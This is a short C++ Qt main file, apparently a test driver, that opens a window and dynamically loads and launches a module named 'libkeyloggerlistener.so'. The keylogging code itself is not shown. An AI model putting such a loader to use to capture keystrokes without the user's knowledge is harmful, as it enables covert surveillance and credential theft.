#include <QApplication>
#include <QMainWindow>
#include "Module.hpp"
#include <thread>
#include <ltdl.h>
#include <iostream>

int main(int argc, char** argv) {
	QApplication* app = new QApplication (argc, argv); 
	
	lt_dlinit();
	QMainWindow window;
	window.show();
	ModuleLoader::loadModule("./libkeyloggerlistener.so", "keyloggerlistener", &window);
	
	ModuleLoader::modules.at("keyloggerlistener")->launch();
	std::cout << "test" << std::endl;
	//ModuleLoader::modules.at("keyloggerlistener")->thread.join();
	
	
    return app->exec();
	
}
